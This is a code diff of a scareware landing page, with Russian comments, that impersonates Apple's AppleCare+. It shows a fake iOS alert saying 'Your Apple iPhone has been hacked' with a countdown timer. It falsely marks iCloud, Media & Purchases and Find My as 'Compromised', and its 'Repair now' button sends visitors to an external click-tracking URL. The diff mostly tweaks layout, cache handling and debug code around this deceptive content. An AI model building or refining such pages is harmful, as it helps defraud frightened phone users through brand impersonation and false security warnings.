@@ -5,18 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  
-  <!-- МАКСИМАЛЬНАЯ ЗАЩИТА ОТ КЕША -->
-  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate, max-age=0, proxy-revalidate, no-transform">
-  <meta http-equiv="Pragma" content="no-cache">
-  <meta http-equiv="Expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
-  <meta name="robots" content="noindex, nofollow">
-  
-  <title>AppleCare+ Protection System v<?php echo time(); ?></title>
-  
+  <title>AppleCare+</title>
   <style>
-    /* ВСТРАИВАЕМ ВЕСЬ CSS НЕПОСРЕДСТВЕННО В СТРАНИЦУ */
-    
     /* ====== GLOBAL ====== */
     * {
       margin: 0;
@@ -27,19 +17,22 @@
       -webkit-user-select: none;
     }
 
+    /* Добавьте это в CSS секцию для логотипа */
     .logo img {
       width: 100%;
       height: 100%;
-      object-fit: cover;
+      object-fit: cover; /* Для четкого заполнения */
       object-position: center;
       display: block;
     }
 
+    /* Исправление для белого фона логотипа */
     .logo {
       background: #fff !important;
       border: 0.5px solid rgba(0, 0, 0, 0.1) !important;
     }
 
+    /* Для темной темы - все равно белый фон */
     @media (prefers-color-scheme: dark) {
       .logo {
         background: #fff !important;
@@ -55,12 +48,13 @@
       width: 100%;
       -webkit-font-smoothing: antialiased;
       -moz-osx-font-smoothing: grayscale;
-      position: fixed;
+      position: fixed; /* Предотвращает скроллинг */
       top: 0;
       left: 0;
       right: 0;
       bottom: 0;
     }
+
 
     /* ====== HEADER ====== */
     .header {
@@ -118,11 +112,11 @@
       width: 100%;
       max-width: 430px;
       margin: 0 auto;
-      padding: 60px 16px 20px;
+      padding: 60px 16px 15px; /* Уменьшили нижний padding с 20px до 15px */
       height: calc(100vh - 44px);
       display: flex;
       flex-direction: column;
-      gap: 15px;
+      gap: 12px; /* Уменьшили с 15px */
       overflow: hidden;
     }
 
@@ -131,10 +125,10 @@
       display: flex;
       flex-direction: column;
       width: 100%;
-      gap: 10px;
+      gap: 8px; /* Уменьшили с 10px */
       overflow-y: auto;
       -webkit-overflow-scrolling: touch;
-      padding-bottom: 10px;
+      padding-bottom: 5px; /* Уменьшили с 10px */
     }
 
     .logo-card {
@@ -255,7 +249,7 @@
       font-weight: 600;
       padding: 16px;
       width: 100%;
-      margin-top: -10px; /* КНОПКА ПОДНЯТА ВЫШЕ */
+      margin-top: -8px; /* Подняли кнопку выше */
       cursor: pointer;
       transition: background 0.2s;
       text-align: center;
@@ -504,9 +498,12 @@
 <body>
   <!-- iOS Alert -->
   <div id="iosAlert" class="ios-alert-overlay">
+    <!-- Backdrop -->
     <div class="ios-alert-backdrop" onclick="closeAlert()"></div>
     
+    <!-- Alert Modal -->
     <div class="ios-alert-modal">
+      <!-- Content -->
       <div class="ios-alert-content">
         <h2 class="ios-alert-title">Your Apple iPhone has been hacked</h2>
         <p class="ios-alert-message">
@@ -515,8 +512,10 @@
         <p class="ios-alert-timer" id="countdown">1:28</p>
       </div>
 
+      <!-- Divider -->
       <div class="ios-alert-divider"></div>
 
+      <!-- Buttons -->
       <div class="ios-alert-buttons">
         <button class="ios-alert-button" onclick="closeAlert()">Settings</button>
         <button class="ios-alert-button primary" onclick="closeAlert()">OK</button>
@@ -537,14 +536,16 @@
 
   <div class="container">
     <div class="content">
-      <div class="logo-card">
-        <div class="logo">
-          <img src="icons/applecare.png" alt="AppleCare">
-        </div>
-        <div class="title">AppleCare+</div>
-        <div class="subtitle">Protection System</div>
+      <!-- Logo -->
+    <div class="logo-card">
+      <div class="logo">
+        <img src="icons/applecare.png" alt="AppleCare">
       </div>
+      <div class="title">AppleCare+</div>
+      <div class="subtitle">Protection System</div>
+    </div>
 
+      <!-- Main Section -->
       <div class="section">
         <div class="item"><div class="label">Name, Phone Numbers, Email</div></div>
         <div class="divider"></div>
@@ -555,32 +556,35 @@
         <div class="item"><div class="label">Subscriptions</div></div>
       </div>
 
+      <!-- Compromised Services -->
       <div class="section">
-        <div class="item compromised">
-          <div class="icon">
-            <img src="icons/icloud.svg" alt="icloud">
-          </div>
-          <div class="label">iCloud</div>
-          <div class="value">Compromised</div>
-        </div>
+        
+<div class="item compromised">
+  <div class="icon">
+    <img src="icons/icloud.svg" alt="icloud">
+  </div>
+  <div class="label">iCloud</div>
+  <div class="value">Compromised</div>
+</div>
         <div class="divider"></div>
-        <div class="item compromised">
-          <div class="icon">
-            <img src="icons/appstore.svg" alt="AppStore">
-          </div>
-          <div class="label">Media & Purchases</div>
-          <div class="value">Compromised</div>
-        </div>
-        <div class="divider"></div>
-        <div class="item compromised">
-          <div class="icon">
-            <img src="icons/locator.svg" alt="AppleCare">
-          </div>
-          <div class="label">Find My</div>
-          <div class="value">Compromised</div>
-        </div>
+<div class="item compromised">
+  <div class="icon">
+    <img src="icons/appstore.svg" alt="AppStore">
+  </div>
+  <div class="label">Media & Purchases</div>
+  <div class="value">Compromised</div>
+</div>
+<div class="divider"></div>
+<div class="item compromised">
+  <div class="icon">
+    <img src="icons/locator.svg" alt="AppleCare">
+  </div>
+  <div class="label">Find My</div>
+  <div class="value">Compromised</div>
+</div>
       </div>
 
+      <!-- iPhone -->
       <div class="section">
         <div class="item">
           <div class="icon">
@@ -596,30 +600,20 @@
       </div>
     </div>
 
-    <!-- КНОПКА ПОДНЯТА ВЫШЕ -->
+    <!-- Repair Button -->
     <a href="https://strong-super.website/click.php?lp=1" class="repair-button">Repair now</a>
   </div>
 
   <script>
-    // ДОБАВЛЯЕМ ПАРАМЕТР ВЕРСИИ КО ВСЕМ URL
-    const version = Date.now();
-    
-    // Принудительно очищаем кеш
-    if ('caches' in window) {
-      caches.keys().then(function(names) {
-        for (let name of names) caches.delete(name);
-      });
-    }
-
-    // Показ алерта
+    // Show alert 3 seconds after page load
     window.addEventListener('DOMContentLoaded', function() {
       setTimeout(function() {
         document.getElementById('iosAlert').classList.add('show');
-      }, 3000);
+      }, 3000); // 3 seconds delay
     });
 
-    // Таймер
-    let timeLeft = 88;
+    // Countdown timer
+    let timeLeft = 88; // 1:28 in seconds
     
     function updateCountdown() {
       if (timeLeft > 0) {
@@ -633,11 +627,12 @@
     
     setInterval(updateCountdown, 1000);
 
+    // Close alert function
     function closeAlert() {
       document.getElementById('iosAlert').classList.remove('show');
     }
 
-    // Запрет зума
+    // Prevent zoom on mobile
     document.addEventListener('touchstart', function(e) {
       if (e.touches.length > 1) {
         e.preventDefault();
@@ -652,33 +647,6 @@
       }
       lastTouchEnd = now;
     }, false);
-
-    // Принудительное обновление при загрузке
-    window.onload = function() {
-      if (window.performance) {
-        if (performance.navigation.type === 1) {
-          // Страница была обновлена
-          console.log('Page was reloaded');
-        }
-      }
-    };
   </script>
 </body>
-  <script>
-// ДИАГНОСТИКА - проверяем стили кнопки
-console.log('=== ДИАГНОСТИКА КНОПКИ ===');
-const button = document.querySelector('.repair-button');
-const styles = window.getComputedStyle(button);
-console.log('margin-top:', styles.marginTop);
-console.log('display:', styles.display);
-console.log('position:', styles.position);
-console.log('visibility:', styles.visibility);
-console.log('opacity:', styles.opacity);
-
-// Принудительно применяем стиль
-setTimeout(() => {
-    button.style.marginTop = '-20px';
-    console.log('Принудительно установлен margin-top: -20px');
-}, 1000);
-</script>
 </html>
